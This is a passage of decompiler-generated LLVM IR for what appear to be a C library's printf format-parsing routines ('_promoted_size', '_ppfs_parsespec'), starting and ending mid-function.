  %v2_bc3c = load i32, i32* %v1_bc3c, align 4
  store i32 %v2_bc3c, i32* %r2.global-to-local, align 4
  %v1_bc40 = add i32 %v3_bbc8, 4
  store i32 %v1_bc40, i32* %r3.global-to-local, align 4
  store i32 %v1_bc40, i32* %v2_bbc8, align 4
  %v0_bc48 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc48 = load i32, i32* %ip.global-to-local, align 4
  %v2_bc48 = inttoptr i32 %v1_bc48 to i32*
  store i32 %v0_bc48, i32* %v2_bc48, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc50:                                ; preds = %dec_label_pc_bbe8, %dec_label_pc_bc20
  %v3_bc50 = load i32, i32* %v2_bbc8, align 4
  store i32 %v3_bc50, i32* %r3.global-to-local, align 4
  %v1_bc54 = inttoptr i32 %v3_bc50 to i32*
  %v2_bc54 = load i32, i32* %v1_bc54, align 4
  store i32 %v2_bc54, i32* %r1.global-to-local, align 4
  %v3_bc54 = add i32 %v3_bc50, 4
  %v4_bc54 = inttoptr i32 %v3_bc54 to i32*
  %v5_bc54 = load i32, i32* %v4_bc54, align 4
  store i32 %v5_bc54, i32* %r2.global-to-local, align 4
  %v1_bc58 = add i32 %v3_bc50, 8
  store i32 %v1_bc58, i32* %r3.global-to-local, align 4
  store i32 %v1_bc58, i32* %v2_bbc8, align 4
  %v0_bc60 = load i32, i32* %ip.global-to-local, align 4
  %v1_bc60 = inttoptr i32 %v0_bc60 to i32*
  %v2_bc60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_bc60, i32* %v1_bc60, align 4
  %v3_bc60 = add i32 %v0_bc60, 4
  %v4_bc60 = inttoptr i32 %v3_bc60 to i32*
  %v5_bc60 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_bc60, i32* %v4_bc60, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bbfc, %dec_label_pc_bbe8, %dec_label_pc_bbdc, %dec_label_pc_bc20
  %v1_bc68 = add i32 %v3_bbc8, 4
  store i32 %v1_bc68, i32* %r3.global-to-local, align 4
  store i32 %v1_bc68, i32* %v2_bbc8, align 4
  %v0_bc70 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc70 = inttoptr i32 %v0_bc70 to i32*
  %v2_bc70 = load i32, i32* %v1_bc70, align 4
  store i32 %v2_bc70, i32* %r3.global-to-local, align 4
  %v1_bc74 = load i32, i32* %ip.global-to-local, align 4
  %v2_bc74 = inttoptr i32 %v1_bc74 to i32*
  store i32 %v2_bc70, i32* %v2_bc74, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc78:                                ; preds = %dec_label_pc_bc50, %dec_label_pc_bc3c, %dec_label_pc_bc28, %dec_label_pc_bc68
  %v0_bc78 = load i32, i32* %ip.global-to-local, align 4
  %v1_bc78 = add i32 %v0_bc78, 8
  store i32 %v1_bc78, i32* %ip.global-to-local, align 4
  %v0_bc7c.pre = load i32, i32* @lr, align 4
  %v0_bc80.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bc7c

dec_label_pc_bc7c:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_bc78
  %v0_bc80 = phi i32 [ %v0_bc8025, %dec_label_pc_bbb8 ], [ %v0_bc80.pre, %dec_label_pc_bc78 ]
  %v0_bc7c = phi i32 [ %v1_bbb824, %dec_label_pc_bbb8 ], [ %v0_bc7c.pre, %dec_label_pc_bc78 ]
  %v1_bc7c = add i32 %v0_bc7c, 1
  store i32 %v1_bc7c, i32* @lr, align 4
  %v1_bc80 = add i32 %v0_bc80, 28
  %v2_bc80 = inttoptr i32 %v1_bc80 to i32*
  %v3_bc80 = load i32, i32* %v2_bc80, align 4
  store i32 %v3_bc80, i32* %r3.global-to-local, align 4
  %v5_bc88 = icmp slt i32 %v1_bc7c, %v3_bc80
  br i1 %v5_bc88, label %dec_label_pc_bbb8, label %dec_label_pc_bc80.dec_label_pc_bc8c.loopexit_crit_edge

dec_label_pc_bc90:                                ; preds = %entry
  br i1 %v6_bb6c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_bc90
  %v2_bc94 = add i32 %v0_bb54, 36
  %v3_bc94 = inttoptr i32 %v2_bc94 to i8*
  %v4_bc94 = load i8, i8* %v3_bc94, align 1
  %v5_bc94 = zext i8 %v4_bc94 to i32
  %v5_bc98 = mul nuw nsw i32 %v5_bc94, 8
  %v6_bc98 = add i32 %v5_bc98, %v1_bb60
  store i32 %v6_bc98, i32* %r3.global-to-local, align 4
  %v2_bc9c = add i32 %v6_bc98, -8
  %v3_bc9c = inttoptr i32 %v2_bc9c to i32*
  %v4_bc9c = load i32, i32* %v3_bc9c, align 4
  store i32 %v4_bc9c, i32* %r3.global-to-local, align 4
  store i32 %v4_bc9c, i32* %v2_bb64, align 4
  %v0_bca4.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_bc90, %bb
  %v2_bcb8 = phi i32 [ %v0_bca4.pre, %bb ], [ %v0_bb54, %dec_label_pc_bc90 ]
  %v1_bca4 = add i32 %v2_bcb8, 4
  %v2_bca4 = inttoptr i32 %v1_bca4 to i32*
  %v3_bca4 = load i32, i32* %v2_bca4, align 4
  store i32 %v3_bca4, i32* %r3.global-to-local, align 4
  %v6_bca8 = icmp eq i32 %v3_bca4, -2147483648
  br i1 %v6_bca8, label %bb15, label %dec_label_pc_bc8c

bb15:                                             ; preds = %.thread2
  %v2_bcac = add i32 %v2_bcb8, 37
  %v3_bcac = inttoptr i32 %v2_bcac to i8*
  %v4_bcac = load i8, i8* %v3_bcac, align 1
  %v5_bcac = zext i8 %v4_bcac to i32
  %v1_bcb0 = load i32, i32* %ip.global-to-local, align 4
  %v5_bcb0 = mul nuw nsw i32 %v5_bcac, 8
  %v6_bcb0 = add i32 %v5_bcb0, %v1_bcb0
  store i32 %v6_bcb0, i32* %r3.global-to-local, align 4
  %v2_bcb4 = add i32 %v6_bcb0, -8
  %v3_bcb4 = inttoptr i32 %v2_bcb4 to i32*
  %v4_bcb4 = load i32, i32* %v3_bcb4, align 4
  store i32 %v4_bcb4, i32* %r3.global-to-local, align 4
  store i32 %v4_bcb4, i32* %v2_bca4, align 4
  %v0_bcbc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bc8c

dec_label_pc_bc80.dec_label_pc_bc8c.loopexit_crit_edge: ; preds = %dec_label_pc_bc7c
  br label %dec_label_pc_bc8c.loopexit

dec_label_pc_bc8c.loopexit:                       ; preds = %dec_label_pc_bc80.dec_label_pc_bc8c.loopexit_crit_edge, %dec_label_pc_bbb0
  %v0_bc80.lcssa = phi i32 [ %v0_bc80, %dec_label_pc_bc80.dec_label_pc_bc8c.loopexit_crit_edge ], [ %v0_bc8018, %dec_label_pc_bbb0 ]
  br label %dec_label_pc_bc8c

dec_label_pc_bc8c:                                ; preds = %dec_label_pc_bc8c.loopexit, %.thread2, %bb15
  %v1_bcdc = phi i32 [ %v0_bc80.lcssa, %dec_label_pc_bc8c.loopexit ], [ %v2_bcb8, %.thread2 ], [ %v0_bcbc.pre, %bb15 ]
  %v1_bcbc = add i32 %v1_bcdc, 8
  %v2_bcbc = inttoptr i32 %v1_bcbc to i32*
  %v3_bcbc = load i32, i32* %v2_bcbc, align 4
  store i32 %v3_bcbc, i32* %r1.global-to-local, align 4
  %v1_bcc0 = icmp slt i32 %v3_bcbc, 0
  br i1 %v1_bcc0, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_bc8c
  %v5_bcc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_bcc4, i32* @r4, align 4
  ret i32 %v1_bcdc

bb17:                                             ; preds = %dec_label_pc_bc8c
  %v1_bcc8 = add i32 %v1_bcdc, 16
  %v2_bcc8 = inttoptr i32 %v1_bcc8 to i32*
  %v3_bcc8 = load i32, i32* %v2_bcc8, align 4
  %v1_bcd0 = sub i32 0, %v3_bcbc
  store i32 %v1_bcd0, i32* %r1.global-to-local, align 4
  %v1_bccc = and i32 %v3_bcc8, -10
  %v1_bcd4 = or i32 %v1_bccc, 8
  store i32 %v1_bcd4, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_bcdc = add i32 %v1_bcdc, 20
  %v3_bcdc = inttoptr i32 %v2_bcdc to i32*
  store i32 32, i32* %v3_bcdc, align 4
  %v0_bce0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bce0 = load i32, i32* @r0, align 4
  %v2_bce0 = add i32 %v1_bce0, 8
  %v3_bce0 = inttoptr i32 %v2_bce0 to i32*
  store i32 %v0_bce0, i32* %v3_bce0, align 4
  %v0_bce4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bce4 = load i32, i32* @r0, align 4
  %v2_bce4 = add i32 %v1_bce4, 16
  %v3_bce4 = inttoptr i32 %v2_bce4 to i32*
  store i32 %v0_bce4, i32* %v3_bce4, align 4
  %v2_bce8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bce8, i32* @r4, align 4
  %v8_bce8 = load i32, i32* @r0, align 4
  ret i32 %v8_bce8

; uselistorder directives
  uselistorder i32 %v1_bc7c, { 2, 1, 0 }
  uselistorder i32 %v0_bc80, { 1, 2, 0 }
  uselistorder i32 %v3_bc50, { 0, 2, 1, 3 }
  uselistorder i32 %v3_bbc8, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_bbc8, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_bbbc, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_bbb824, { 1, 0 }
  uselistorder i32 %v0_bc8018, { 2, 0, 1 }
  uselistorder i32 %v0_bb54, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_bc8c, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_bc7c, { 1, 0 }
  uselistorder label %dec_label_pc_bc78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_bc68, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_bc50, { 1, 0 }
  uselistorder label %dec_label_pc_bc3c, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %dec_label_pc_bbb0, { 1, 0 }
  uselistorder label %dec_label_pc_bb8c, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_bd08.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %dec_label_pc_bd10, %entry
  %v0_bcf4 = phi i32 [ %v1_bcf4, %dec_label_pc_bd10 ], [ ptrtoint (i32* @global_var_137b0.455 to i32), %entry ]
  %v1_bcf4 = add i32 %v0_bcf4, -2
  %v1_bcf8 = add i32 %v0_bcf4, -1
  %v2_bcf8 = inttoptr i32 %v1_bcf8 to i8*
  %v3_bcf8 = load i8, i8* %v2_bcf8, align 1
  %v4_bcf8 = zext i8 %v3_bcf8 to i32
  %v1_bcfc = inttoptr i32 %v1_bcf4 to i8*
  %v2_bcfc = load i8, i8* %v1_bcfc, align 2
  %v3_bcfc = zext i8 %v2_bcfc to i32
  %v3_bd00 = mul nuw i32 %v4_bcf8, 16777216
  %v4_bd04 = sdiv i32 %v3_bd00, 65536
  %v5_bd04 = or i32 %v4_bd04, %v3_bcfc
  %v9_bd08 = icmp eq i32 %v5_bd04, %v1_bd08.pre
  br i1 %v9_bd08, label %dec_label_pc_bcf4.dec_label_pc_bd1c_crit_edge, label %dec_label_pc_bd10

dec_label_pc_bcf4.dec_label_pc_bd1c_crit_edge:    ; preds = %dec_label_pc_bcf4
  br label %dec_label_pc_bd1c

dec_label_pc_bd10:                                ; preds = %dec_label_pc_bcf4
  %tmp = icmp ugt i32 %v1_bcf4, ptrtoint (i32* @global_var_13798.457 to i32)
  br i1 %tmp, label %dec_label_pc_bcf4, label %dec_label_pc_bd1c

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bd10, %dec_label_pc_bcf4.dec_label_pc_bd1c_crit_edge
  %v2_bd24.pre-phi = sub i32 %v1_bcf4, ptrtoint (i32* @global_var_13798.457 to i32)
  store i32 ptrtoint (i32* @global_var_137b0.455 to i32), i32* @r2, align 4
  %v4_bd28 = sdiv i32 %v2_bd24.pre-phi, 2
  %v5_bd28 = add i32 %v4_bd28, ptrtoint (i32* @global_var_137b0.455 to i32)
  %v6_bd28 = inttoptr i32 %v5_bd28 to i8*
  %v7_bd28 = load i8, i8* %v6_bd28, align 1
  %v9_bd28 = zext i8 %v7_bd28 to i32
  ret i32 %v9_bd28

; uselistorder directives
  uselistorder i32 %v1_bcf4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bcf4, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_137b0.455 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_bd3c = load i32, i32* @r4, align 4
  store i32 %v3_bd3c, i32* %stack_var_-32, align 4
  %v6_bd3c = load i32, i32* @r5, align 4
  %v25_bd3c = ptrtoint i32* %stack_var_-32 to i32
  %v1_bd40 = add i32 %tmp, 16
  %v2_bd40 = inttoptr i32 %v1_bd40 to i32*
  %v3_bd40 = load i32, i32* %v2_bd40, align 4
  %v2_bd44 = ptrtoint i32* %stack_var_-88 to i32
  %v1_bd48 = and i32 %v3_bd40, 128
  store i32 %v1_bd48, i32* @r4, align 4
  %v2_bd48 = icmp eq i32 %v1_bd48, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_bd68 = add i32 %tmp, 24
  %v2_bd68 = inttoptr i32 %v1_bd68 to i32*
  %v3_bd68 = load i32, i32* %v2_bd68, align 4
  store i32 %v3_bd68, i32* %sb.global-to-local, align 4
  br i1 %v2_bd48, label %bb, label %dec_label_pc_bd88

bb:                                               ; preds = %entry
  %v3_bd6c = load i32, i32* %arg1, align 4
  br label %dec_label_pc_bdd4

dec_label_pc_bd78:                                ; preds = %dec_label_pc_bf58
  %v0_bd78 = load i32, i32* %r0.global-to-local, align 4
  %v0_bf88.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_bf80

dec_label_pc_bd80:                                ; preds = %dec_label_pc_bf84
  %v1_bd80 = add i32 %v0_bf88.pre, 1
  store i32 %v1_bd80, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bd88:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd8c

dec_label_pc_bd8c:                                ; preds = %dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge, %dec_label_pc_bd88
  %v1_bd9c = phi i32 [ %v1_bdb0, %dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge ], [ 0, %dec_label_pc_bd88 ]
  %v0_bd8c = phi i32 [ %v0_bd8c.pre, %dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge ], [ %tmp, %dec_label_pc_bd88 ]
  %v1_bd8c = inttoptr i32 %v0_bd8c to i32*
  %v2_bd8c = load i32, i32* %v1_bd8c, align 4
  %v4_bd90 = mul i32 %v1_bd9c, 4
  %v5_bd90 = add i32 %v2_bd8c, %v4_bd90
  store i32 %v5_bd90, i32* %r3.global-to-local, align 4
  %v1_bd94 = add i32 %v5_bd90, -4
  %v2_bd94 = inttoptr i32 %v1_bd94 to i32*
  %v3_bd94 = load i32, i32* %v2_bd94, align 4
  store i32 %v3_bd94, i32* %r1.global-to-local, align 4
  store i32 %v25_bd3c, i32* @ip, align 4
  %v2_bd9c = add i32 %v1_bd9c, %v25_bd3c
  store i32 %v2_bd9c, i32* %r2.global-to-local, align 4
  %v1_bda0 = trunc i32 %v3_bd94 to i8
  %v3_bda0 = add i32 %v2_bd9c, -56
  %v4_bda0 = inttoptr i32 %v3_bda0 to i8*
  store i8 %v1_bda0, i8* %v4_bda0, align 1
  %v0_bda4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bda4 = add i32 %v0_bda4, -56
  %v2_bda4 = inttoptr i32 %v1_bda4 to i8*
  %v3_bda4 = load i8, i8* %v2_bda4, align 1
  %v4_bda4 = zext i8 %v3_bda4 to i32
  store i32 %v4_bda4, i32* %r2.global-to-local, align 4
  %v0_bda8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bda8 = add i32 %v0_bda8, -4
  %v2_bda8 = inttoptr i32 %v1_bda8 to i32*
  %v3_bda8 = load i32, i32* %v2_bda8, align 4
  store i32 %v3_bda8, i32* %r3.global-to-local, align 4
  %v9_bdac = icmp eq i32 %v4_bda4, %v3_bda8
  %v0_bdb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_bdb0 = add i32 %v0_bdb0, 1
  store i32 %v1_bdb0, i32* %r0.global-to-local, align 4
  br i1 %v9_bdac, label %dec_label_pc_bdb8, label %dec_label_pc_c1d0

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bd8c
  %v2_bdb8 = icmp eq i8 %v3_bda4, 0
  br i1 %v2_bdb8, label %dec_label_pc_bdc8, label %dec_label_pc_bdc0

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bdb8
  %tmp166 = icmp ult i32 %v1_bdb0, 32
  br i1 %tmp166, label %dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge, label %dec_label_pc_bdc8

dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge:    ; preds = %dec_label_pc_bdc0
  %v0_bd8c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_bd8c

dec_label_pc_bdc8:                                ; preds = %dec_label_pc_bdc0, %dec_label_pc_bdb8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bdd0 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_bdd4

dec_label_pc_bdd4:                                ; preds = %bb, %dec_label_pc_bdc8
  %storemerge102 = phi i32 [ %v2_bdd0, %dec_label_pc_bdc8 ], [ %v3_bd6c, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_bde4

dec_label_pc_bde0:                                ; preds = %.thread22, %dec_label_pc_bef0
  %v0_bde0 = phi i32 [ %v2_bf68, %.thread22 ], [ %storemerge105, %dec_label_pc_bef0 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_bef0 ]
  store i32 %v0_bde0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bde4

dec_label_pc_bde4:                                ; preds = %dec_label_pc_bdd4, %dec_label_pc_bde0
  %v1_be00 = phi i32 [ %storemerge102, %dec_label_pc_bdd4 ], [ %v0_bde0, %dec_label_pc_bde0 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_bdd4 ], [ %stack_var_-48.0, %dec_label_pc_bde0 ]
  %v1_bde4 = inttoptr i32 %v1_be00 to i8*
  %v2_bde4 = load i8, i8* %v1_bde4, align 1
  %v3_bde4 = zext i8 %v2_bde4 to i32
  store i32 %v3_bde4, i32* %r3.global-to-local, align 4
  %v7_bde8 = icmp eq i8 %v2_bde4, 42
  br i1 %v7_bde8, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_bde4
  store i32 %v1_be00, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_bde4
  %v1_bdf4 = load i32, i32* @lr, align 4
  %v4_bdf4 = mul i32 %v1_bdf4, -4
  %v5_bdf4 = add i32 %v4_bdf4, %v25_bd3c
  store i32 %v5_bdf4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_be00 = add i32 %v1_be00, 1
  store i32 %v2_be00, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_be08 = add i32 %v5_bdf4, -12
  %v4_be08 = inttoptr i32 %v3_be08 to i32*
  store i32 0, i32* %v4_be08, align 4
  %v0_be2c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_be2c.pre = phi i32 [ %v0_be2c.pre.pre, %bb124 ], [ %v1_be00, %.thread9.thread ]
  %v2_be30.pre = load i32, i32* @global_var_1d7a4, align 4
  br label %.backedge

dec_label_pc_be10:                                ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_be14 = load i32, i32* %r0.global-to-local, align 4
  %v7_be18 = icmp sgt i32 %v0_be14, 4094
  br i1 %v7_be18, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_be10
  %v1_be2014 = add i32 %v0_bea4, 1
  store i32 %v1_be2014, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_be10
  %v11_be1c = mul i32 %v0_be14, 10
  %v12_be1c = add i32 %v11_be1c, %v3_be2c
  store i32 %v12_be1c, i32* %r3.global-to-local, align 4
  %v1_be20 = add i32 %v0_bea4, 1
  store i32 %v1_be20, i32* %r6.global-to-local, align 4
  %v9_be24 = add i32 %v12_be1c, -48
  store i32 %v9_be24, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_bea4 = phi i32 [ %v0_be2c.pre, %.preheader ], [ %v1_be20, %bb126 ], [ %v1_be2014, %.thread12 ]
  store i32 120740, i32* %r3.global-to-local, align 4
  %v1_be2c = inttoptr i32 %v0_bea4 to i8*
  %v2_be2c = load i8, i8* %v1_be2c, align 1
  %v3_be2c = zext i8 %v2_be2c to i32
  store i32 %v3_be2c, i32* %r2.global-to-local, align 4
  store i32 %v2_be30.pre, i32* %r3.global-to-local, align 4
  %v3_be34 = mul nuw nsw i32 %v3_be2c, 2
  %v4_be34 = add i32 %v3_be34, %v2_be30.pre
  %v5_be34 = inttoptr i32 %v4_be34 to i8*
  %v6_be34 = load i8, i8* %v5_be34, align 1
  %v8_be34 = zext i8 %v6_be34 to i32
  store i32 %v8_be34, i32* %r3.global-to-local, align 4
  %v1_be38 = and i32 %v8_be34, 8
  %v2_be38 = icmp eq i32 %v1_be38, 0
  br i1 %v2_be38, label %dec_label_pc_be40, label %dec_label_pc_be10

dec_label_pc_be40:                                ; preds = %.backedge
  %v0_be40 = load i32, i32* %r1.global-to-local, align 4
  %v1_be40 = add i32 %v0_be40, -1
  %v2_be40 = inttoptr i32 %v1_be40 to i8*
  %v3_be40 = load i8, i8* %v2_be40, align 1
  %v4_be40 = zext i8 %v3_be40 to i32
  store i32 %v4_be40, i32* %r3.global-to-local, align 4
  %v7_be44 = icmp eq i8 %v3_be40, 37
  br i1 %v7_be44, label %dec_label_pc_be4c, label %dec_label_pc_bf08

dec_label_pc_be4c:                                ; preds = %dec_label_pc_be40
  %v7_be4c = icmp eq i8 %v2_be2c, 36
  %. = zext i1 %v7_be4c to i32
  store i32 %., i32* @ip, align 4
  %v0_be58 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_be58, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_be4c
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_be4c, %bb130
  %v1_beb4 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_be4c ]
  %v2_be60 = icmp eq i32 %v1_beb4, 0
  %v0_be90 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_be60, label %dec_label_pc_be90, label %dec_label_pc_be68

dec_label_pc_be68:                                ; preds = %thread-pre-split
  %v2_be90 = icmp eq i32 %v0_be90, 0
  %v1_be6c = add i32 %v0_bea4, 1
  store i32 %v1_be6c, i32* %r1.global-to-local, align 4
  br i1 %v2_be90, label %dec_label_pc_c1d0, label %dec_label_pc_be74

dec_label_pc_be74:                                ; preds = %dec_label_pc_be68
  %v2_be74 = sub i32 %v0_be58, %v0_be90
  %v4_be74 = xor i32 %v0_be90, %v0_be58
  %v5_be74 = xor i32 %v2_be74, %v0_be58
  %v6_be74 = and i32 %v5_be74, %v4_be74
  %v7_be74 = icmp slt i32 %v6_be74, 0
  %v8_be74 = icmp slt i32 %v2_be74, 0
  %v9_be74 = icmp eq i32 %v0_be58, %v0_be90
  %v3_be78 = xor i1 %v8_be74, %v7_be74
  %v4_be78 = or i1 %v9_be74, %v3_be78
  br i1 %v4_be78, label %dec_label_pc_be88, label %bb131

bb131:                                            ; preds = %dec_label_pc_be74
  store i32 %v0_be58, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_be88

dec_label_pc_be84:                                ; preds = %dec_label_pc_bea4, %dec_label_pc_beac
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_be88

dec_label_pc_be88:                                ; preds = %bb131, %dec_label_pc_be74, %dec_label_pc_be84
  %v0_be88 = phi i32 [ %v0_be40, %dec_label_pc_be84 ], [ %v1_be6c, %dec_label_pc_be74 ], [ %v1_be6c, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_be84 ], [ %v0_be58, %dec_label_pc_be74 ], [ %v0_be58, %bb131 ]
  br label %dec_label_pc_bec0

dec_label_pc_be90:                                ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_be90, 1
  br i1 %tmp132, label %dec_label_pc_bea4, label %dec_label_pc_be98

dec_label_pc_be98:                                ; preds = %dec_label_pc_be90
  %v7_be98 = icmp eq i8 %v2_be2c, 109
  br i1 %v7_be98, label %dec_label_pc_bf08, label %dec_label_pc_c1d0

dec_label_pc_bea4:                                ; preds = %dec_label_pc_be90
  %tmp167 = icmp ugt i32 %v0_bea4, %v0_be40
  br i1 %tmp167, label %dec_label_pc_beac, label %dec_label_pc_be84

dec_label_pc_beac:                                ; preds = %dec_label_pc_bea4
  %v1_beac = inttoptr i32 %v0_be40 to i8*
  %v2_beac = load i8, i8* %v1_beac, align 1
  %v3_beac = zext i8 %v2_beac to i32
  store i32 %v3_beac, i32* %r3.global-to-local, align 4
  %v7_beb0 = icmp eq i8 %v2_beac, 48
  br i1 %v7_beb0, label %dec_label_pc_be84, label %bb133

bb133:                                            ; preds = %dec_label_pc_beac
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_bf08

dec_label_pc_bec0.loopexit:                       ; preds = %dec_label_pc_bec8
  %v1_bed4 = load i32, i32* @r4, align 4
  %v3_bed4 = or i32 %v1_bed4, %v0_bee8
  store i32 %v3_bed4, i32* @r4, align 4
  %v2_bed8 = add i32 %storemerge105, 1
  br label %dec_label_pc_bec0

dec_label_pc_bec0:                                ; preds = %dec_label_pc_bec0.loopexit, %dec_label_pc_be88
  %storemerge105 = phi i32 [ %v0_be88, %dec_label_pc_be88 ], [ %v2_bed8, %dec_label_pc_bec0.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_13790.464 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_becc = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bee0, %dec_label_pc_bec0
  %v0_bee8 = phi i32 [ %v2_bee8, %dec_label_pc_bee0 ], [ 1, %dec_label_pc_bec0 ]
  %v0_bec8 = phi i32 [ %v5_bec8, %dec_label_pc_bee0 ], [ ptrtoint ([8 x i8]* @global_var_13790.464 to i32), %dec_label_pc_bec0 ]
  %v1_bec8 = inttoptr i32 %v0_bec8 to i8*
  %v2_bec8 = load i8, i8* %v1_bec8, align 1
  %v3_bec8 = zext i8 %v2_bec8 to i32
  store i32 %v3_bec8, i32* %r2.global-to-local, align 4
  %v5_bec8 = add i32 %v0_bec8, 1
  store i32 %v5_bec8, i32* %r1.global-to-local, align 4
  %v2_becc = load i8, i8* %v1_becc, align 1
  %v3_becc = zext i8 %v2_becc to i32
  store i32 %v3_becc, i32* %r3.global-to-local, align 4
  %v9_bed0 = icmp eq i8 %v2_becc, %v2_bec8
  br i1 %v9_bed0, label %dec_label_pc_bec0.loopexit, label %dec_label_pc_bee0

dec_label_pc_bee0:                                ; preds = %dec_label_pc_bec8
  %v1_bee0 = inttoptr i32 %v5_bec8 to i8*
